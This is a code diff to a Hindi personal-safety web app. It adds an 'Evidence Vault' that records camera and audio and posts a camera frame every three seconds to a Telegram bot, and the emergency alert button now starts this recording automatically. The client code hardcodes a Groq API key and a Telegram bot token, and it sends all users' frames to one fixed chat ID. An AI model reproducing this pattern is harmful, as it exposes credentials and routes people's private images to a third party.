@@ -676,6 +676,21 @@
   <button class="nav-btn" id="nav-cyber" onclick="showPage('cyber')"><span class="nav-icon">🛡️</span><span class="nav-label">सुरक्षा साथी</span></button>
   <button class="nav-btn" id="nav-sahara" onclick="showPage('sahara')"><span class="nav-icon">🌸</span><span class="nav-label">साहारा</span></button>
 </nav>
+  <div class="evidence-vault-card" style="background: #111; color: #fff; padding: 20px; border-radius: 12px; text-align: center; margin: 25px auto; max-width: 450px; box-shadow: 0 4px 15px rgba(255,51,102,0.3); border: 1px solid #FF3366; font-family: sans-serif;">
+    
+    <h3 style="color: #FF3366; margin-top: 0; font-size: 20px; letter-spacing: 0.5px;">🛡️ डिजिटल साक्ष्य वॉल्ट (Evidence Vault)</h3>
+    <p style="font-size: 13px; color: #bbb; margin-bottom: 15px;">तुरंत लाइव वीडियो साक्ष्य रिकॉर्ड करें। यह फ़ाइल आपके डिवाइस में सेव होगी और लाइव फोटो सीधे टेलीग्राम क्लाउड पर बीम होंगी।</p>
+    
+    <video id="vaultPreview" autoplay muted playsinline style="width: 100%; max-height: 220px; background: #222; border-radius: 8px; margin-bottom: 15px; display: none; object-fit: cover; border: 1px solid #444;"></video>
+    
+    <div id="vaultStatus" style="font-size: 14px; color: #FFD700; margin-bottom: 15px; font-weight: 500;">🔴 सिस्टम निष्क्रिय (Camera Closed)</div>
+    
+    <div style="display: flex; gap: 10px; justify-content: center;">
+        <button id="startVaultBtn" onclick="startVaultCamera()" style="background: #222; color: white; border: 1px solid #FF3366; padding: 12px 20px; border-radius: 6px; font-weight: bold; cursor: pointer; transition: 0.2s;">📷 कैमरा चालू करें</button>
+        
+        <button id="recVaultBtn" onclick="toggleVaultRecording()" style="background: #FF3366; color: white; border: none; padding: 12px 20px; border-radius: 6px; font-weight: bold; cursor: pointer; display: none; transition: 0.2s;">⏺️ साक्ष्य रिकॉर्ड करें</button>
+    </div>
+</div>
 
 <script>
 const GROQ_API_KEY = "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";
@@ -1069,6 +1084,7 @@ async function triggerAwaazDo(){
   btn.textContent='⏳ SMS भेजा जा रहा है...';
   btn.style.background='#333';
   status.textContent='🔄 आपके contacts को alert किया जा रहा है...';
+  startVaultCamera().then(() => toggleVaultRecording());
   
   try{
     const phoneNumbers = Array.isArray(awaazRegistration.contacts) 
@@ -1101,5 +1117,77 @@ async function triggerAwaazDo(){
     btn.disabled=false;
     status.textContent='❌ Connection error: '+e.message+' — इंटरनेट जाँचें।';
   }
+}
+  // ==========================================
+// EVIDENCE VAULT ENGINE
+// ==========================================
+const TELEGRAM_TOKEN = "8924617309:AAFvoYjyHWkrAOzB1VFjza0g9Yl2z2-DT4U"; 
+const TELEGRAM_CHAT_ID = "6683926456"; 
+
+let vaultStream = null;
+let vaultRecorder = null;
+let vaultChunks = [];
+let beamInterval = null;
+
+async function startVaultCamera() {
+    const videoEl = document.getElementById('vaultPreview');
+    const statusEl = document.getElementById('vaultStatus');
+    const recBtn = document.getElementById('recVaultBtn');
+    const startBtn = document.getElementById('startVaultBtn');
+    try {
+        vaultStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+        videoEl.srcObject = vaultStream;
+        videoEl.style.display = 'block';
+        statusEl.textContent = '🟢 कैमरा सक्रिय है। क्लाउड-बीम चालू।';
+        recBtn.style.display = 'inline-block';
+        startBtn.style.display = 'none';
+    } catch (err) {
+        statusEl.textContent = '❌ कैमरा अनुमति दें।';
+    }
+}
+
+function toggleVaultRecording() {
+    const recBtn = document.getElementById('recVaultBtn');
+    const statusEl = document.getElementById('vaultStatus');
+    const videoEl = document.getElementById('vaultPreview');
+    if (vaultRecorder && vaultRecorder.state === "recording") {
+        clearInterval(beamInterval); 
+        vaultRecorder.stop(); 
+        recBtn.textContent = "⏺️ साक्ष्य रिकॉर्ड करें";
+        if(vaultStream) { vaultStream.getTracks().forEach(t => t.stop()); }
+        videoEl.style.display = 'none';
+        document.getElementById('startVaultBtn').style.display = 'inline-block';
+        recBtn.style.display = 'none';
+    } else {
+        vaultChunks = [];
+        vaultRecorder = new MediaRecorder(vaultStream, { mimeType: 'video/webm' });
+        vaultRecorder.ondataavailable = (e) => { if (e.data.size > 0) vaultChunks.push(e.data); };
+        vaultRecorder.onstop = () => {
+            const blob = new Blob(vaultChunks, { type: 'video/webm' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url; a.download = 'evidence_' + Date.now() + '.webm';
+            a.click();
+        };
+        vaultRecorder.start();
+        beamInterval = setInterval(snapAndBeam, 3000); 
+        recBtn.textContent = "⏹️ रिकॉर्डिंग रोकें";
+        statusEl.textContent = "🔴 साक्ष्य क्लाउड में जा रहा है...";
+    }
+}
+
+async function snapAndBeam() {
+    const video = document.getElementById('vaultPreview');
+    if (!video || video.style.display === 'none') return;
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+    canvas.getContext('2d').drawImage(video, 0, 0);
+    canvas.toBlob(async (blob) => {
+        const formData = new FormData();
+        formData.append('chat_id', TELEGRAM_CHAT_ID);
+        formData.append('photo', blob, 'frame.jpg');
+        formData.append('caption', '⚠️ LIVE EVIDENCE: ' + new Date().toLocaleTimeString());
+        try { await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, { method: 'POST', body: formData }); } catch (err) {}
+    }, 'image/jpeg', 0.5); 
 }
 </script>
